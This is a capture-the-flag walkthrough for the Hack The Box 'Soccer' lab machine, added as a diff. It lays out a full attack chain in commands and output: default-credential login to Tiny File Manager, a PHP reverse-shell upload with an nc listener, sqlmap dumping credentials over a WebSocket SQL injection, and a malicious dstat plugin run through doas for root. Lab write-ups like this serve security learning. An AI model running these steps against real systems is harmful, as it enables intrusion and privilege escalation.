@@ -1,0 +1,564 @@
+# Hack The Box - Soccer
+> OS: Linux  
+> Attack Path: Default Credentials → Tiny File Manager RCE → WebSocket SQL Injection → Credential Dumping → doas/dstat Privilege Escalation
+> Youtube Help: https://www.youtube.com/watch?v=P38IKp9S1ts
+---
+
+# Summary
+
+The **Soccer** machine starts with the discovery of a vulnerable **Tiny File Manager** instance exposed on the web server. Using default credentials, it is possible to gain administrative access and upload a malicious PHP file to obtain a reverse shell as **www-data**.
+
+During local enumeration, a virtual host named **soc-player.soccer.htb** is discovered. The application behind this virtual host uses a **WebSocket** backend that is vulnerable to **Blind SQL Injection**. Exploiting this SQLi allows extraction of credentials for the **player** user.
+
+Finally, the machine can be fully compromised because the **player** account is allowed to run **dstat** as root through **doas**. By abusing the plugin functionality of dstat, arbitrary Python code is executed as root, resulting in a root shell.
+
+---
+
+# References
+
+- Reverse Shell Generator: https://www.revshells.com/
+- Linux Privilege Escalation Notes: https://github.com/antonytuff/Red-Team-Notes/blob/master/InfoSec-Learning-Materials/OSCP-Survival-Guide.md#linux-privilege-escalation
+- Tiny File Manager CVE: https://github.com/BKreisel/CVE-2021-45010
+- GTFOBins - doas: https://gtfobins.org/gtfobins/doas/
+
+---
+
+# Enumeration
+
+## Nmap Scan
+
+First, perform a service and version scan.
+
+```bash
+nmap -T5 -sV -sC -Pn 10.129.31.17 -v
+```
+
+Output:
+
+```text
+PORT     STATE SERVICE         VERSION
+22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.5
+80/tcp   open  http            nginx 1.18.0 (Ubuntu)
+9091/tcp open  xmltec-xmlmail?
+```
+
+Interesting findings:
+
+- SSH available on port 22.
+- Nginx web server running on port 80.
+- Unusual service running on port 9091.
+- HTTP redirects to:
+
+```text
+http://soccer.htb
+```
+
+Add the hostname locally:
+
+```bash
+echo "10.129.31.17 soccer.htb" | sudo tee -a /etc/hosts
+```
+
+---
+
+# Web Enumeration
+
+## Nikto
+
+```bash
+nikto -h http://soccer.htb
+```
+
+Finding:
+
+```text
+nginx/1.18.0 appears to be outdated
+```
+
+---
+
+## Directory Bruteforcing
+
+```bash
+gobuster dir \
+-u http://soccer.htb \
+-w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-small.txt
+```
+
+Result:
+
+```text
+/tiny (Status: 301)
+```
+
+Browsing to:
+
+```text
+http://soccer.htb/tiny/
+```
+
+reveals:
+
+```text
+Tiny File Manager v2.4.3
+```
+
+---
+
+# Tiny File Manager Exploitation
+
+## Default Credentials
+
+Since this is a commonly deployed application, checking for default credentials is worthwhile.
+
+Working credentials:
+
+```text
+admin : admin@123
+```
+
+After authentication we gain access to:
+
+```text
+http://soccer.htb/tiny/tinyfilemanager.php?p=
+```
+
+---
+
+## Upload Functionality
+
+An upload directory is available:
+
+```text
+http://soccer.htb/tiny/tinyfilemanager.php?p=tiny%2Fuploads
+```
+
+The application allows file uploads if the target directory has proper write permissions.
+
+While an exploit exists for CVE-2021-45010:
+
+```text
+https://github.com/BKreisel/CVE-2021-45010
+```
+
+I initially attempted to use it.
+
+```bash
+cve-2021-45010 \
+-u http://soccer.htb/tiny/ \
+-l admin \
+-p admin@1234 \
+-g tiny/uploads \
+-r uploads
+```
+
+Output:
+
+```text
+[-] Error: Login Failed.
+```
+
+Since the automated exploit was unsuccessful, I switched to a manual approach.
+
+---
+
+# Reverse Shell as www-data
+
+Generate a PHP reverse shell.
+
+Reference:
+
+```text
+https://www.revshells.com/
+```
+
+Start a listener:
+
+```bash
+nc -lvnp 4443
+```
+
+Upload the PHP reverse shell:
+
+```text
+rev.php
+```
+
+Browse to:
+
+```text
+http://soccer.htb/tiny/uploads/rev.php
+```
+
+The listener receives a connection.
+
+Verify access:
+
+```bash
+whoami
+```
+
+Output:
+
+```text
+www-data
+```
+
+Initial foothold obtained.
+
+---
+
+# Stabilizing the Shell
+
+Spawn a fully interactive TTY.
+
+```bash
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+```
+
+Result:
+
+```text
+www-data@soccer:/home/player$
+```
+
+---
+
+# Internal Enumeration
+
+Attempting sudo access:
+
+```bash
+sudo su
+```
+
+Password is required.
+
+---
+
+## Running Processes
+
+Check processes running as root.
+
+```bash
+ps aux | grep root
+```
+
+Nothing immediately useful is revealed.
+
+---
+
+## SUID / SGID Enumeration
+
+Several useful commands were used during enumeration:
+
+```bash
+find / -perm +2000 -user root -type f -print
+```
+
+```bash
+find / -perm -1000 -type d 2>/dev/null
+```
+
+```bash
+find / -perm -g=s -type f 2>/dev/null
+```
+
+```bash
+find / -perm -u=s -type f 2>/dev/null
+```
+
+```bash
+find / -perm -g=s -o -perm -u=s -type f 2>/dev/null
+```
+
+```bash
+for i in `locate -r "bin$"`; do
+find $i \( -perm -4000 -o -perm -2000 \) -type f 2>/dev/null
+done
+```
+
+```bash
+find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2>/dev/null
+```
+
+Interesting SUID binaries:
+
+```bash
+find / -perm -u=s -type f 2>/dev/null
+```
+
+Output:
+
+```text
+/usr/local/bin/doas
+/usr/lib/snapd/snap-confine
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/openssh/ssh-keysign
+```
+
+At this point, **doas** appears potentially interesting, but we do not yet have enough information to exploit it.
+
+---
+
+# Discovering a New Virtual Host
+
+While running additional enumeration tools (LinPEAS), a new virtual host is discovered:
+
+```text
+soc-player.soccer.htb
+```
+
+Add it to the hosts file:
+
+```bash
+echo "10.129.31.17 soc-player.soccer.htb" | sudo tee -a /etc/hosts
+```
+
+---
+
+# VHost Enumeration
+
+Run Gobuster against the new host.
+
+```bash
+gobuster dir \
+-u http://soc-player.soccer.htb/ \
+-w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-small.txt
+```
+
+Results:
+
+```text
+/login
+/signup
+/check
+/match
+```
+
+The login portal is located at:
+
+```text
+http://soc-player.soccer.htb/login
+```
+
+---
+
+# WebSocket Investigation
+
+Create a user account and authenticate.
+
+After login, the application redirects to:
+
+```text
+http://soc-player.soccer.htb/check
+```
+
+Using browser Developer Tools (Network tab), we observe WebSocket traffic.
+
+Interesting request:
+
+```text
+ws://soc-player.soccer.htb:9091/
+```
+
+This explains the previously unknown service running on port 9091.
+
+---
+
+# WebSocket SQL Injection
+
+Intercepting traffic with Burp Suite reveals a JSON structure:
+
+```json
+{
+    "id":"111111"
+}
+```
+
+This indicates user-controlled input is being sent directly to the backend.
+
+A potential SQL Injection can be tested using SQLMap's WebSocket support.
+
+---
+
+## SQLMap
+
+```bash
+sqlmap \
+-u ws://soc-player.soccer.htb:9091 \
+-data '{"id":"*"}' \
+--batch \
+--level 3 \
+--risk 3 \
+--dump
+```
+
+After allowing SQLMap to increase testing depth, the database contents are dumped.
+
+Credentials recovered:
+
+```text
++------+-------------------+----------------------+----------+
+| id   | email             | password             | username |
++------+-------------------+----------------------+----------+
+| 1324 | player@player.htb | PlayerOftheMatch2022 | player   |
++------+-------------------+----------------------+----------+
+```
+
+---
+
+# Lateral Movement
+
+Using the discovered credentials:
+
+```text
+player : PlayerOftheMatch2022
+```
+
+Switch users from the existing shell:
+
+```bash
+su player
+```
+
+We now have:
+
+```text
+player@soccer:/$
+```
+
+---
+
+# Privilege Escalation
+
+## Investigating doas
+
+Since **doas** was previously discovered as a SUID binary, it is time to investigate it further.
+
+Reference:
+
+```text
+https://gtfobins.org/gtfobins/doas/
+```
+
+Locate its configuration.
+
+```bash
+find / -type f -name *doas* 2>/dev/null
+```
+
+Output:
+
+```text
+/usr/local/share/man/man5/doas.conf.5
+/usr/local/share/man/man1/doas.1
+/usr/local/share/man/man8/vidoas.8
+/usr/local/share/man/man8/doasedit.8
+/usr/local/bin/doasedit
+/usr/local/bin/doas
+/usr/local/bin/vidoas
+/usr/local/etc/doas.conf
+```
+
+Read the configuration:
+
+```bash
+cat /usr/local/etc/doas.conf
+```
+
+Output:
+
+```text
+permit nopass player as root cmd /usr/bin/dstat
+```
+
+This means:
+
+- User `player` may execute `dstat`
+- As `root`
+- Without a password
+
+---
+
+# Abusing dstat Plugins
+
+The dstat tool supports external Python plugins.
+
+If we can create a custom plugin, dstat will import and execute it.
+
+Create a malicious plugin:
+
+```bash
+echo "import os; os.system('/bin/bash')" > /usr/local/share/dstat/dstat_root.py
+```
+
+Verify:
+
+```bash
+ls /usr/local/share/dstat
+```
+
+Output:
+
+```text
+dstat_root.py
+```
+
+---
+
+# Root Shell
+
+Execute dstat through doas:
+
+```bash
+doas /usr/bin/dstat --root
+```
+
+The malicious plugin executes automatically and spawns a shell.
+
+Verify privileges:
+
+```bash
+whoami
+```
+
+Output:
+
+```text
+root
+```
+
+Success:
+
+```text
+root@soccer:/home/player#
+```
+
+---
+
+# Attack Chain Recap
+
+1. Enumerated ports with Nmap.
+2. Discovered `/tiny` using Gobuster.
+3. Logged into Tiny File Manager using default credentials.
+4. Uploaded a malicious PHP reverse shell.
+5. Obtained shell access as `www-data`.
+6. Enumerated the host and discovered `soc-player.soccer.htb`.
+7. Created an account and analyzed WebSocket traffic.
+8. Identified Blind SQL Injection through WebSockets.
+9. Used SQLMap to dump credentials.
+10. Switched to user `player`.
+11. Enumerated SUID binaries and inspected `doas`.
+12. Found `player` could run `dstat` as root without a password.
+13. Abused dstat plugin loading to execute Python code as root.
+14. Obtained a root shell and completed the box.
+
+# Lessons Learned
+
+- Always check for default credentials on self-hosted applications.
+- Don't ignore secondary ports discovered during enumeration.
+- WebSockets can be vulnerable to SQL Injection just like traditional HTTP endpoints.
+- LinPEAS and local enumeration often reveal hidden virtual hosts and internal attack paths.
+- Alternative privilege delegation tools such as **doas** should be reviewed with the same attention as **sudo**.
+- GTFOBins remains an invaluable resource for Linux privilege escalation.
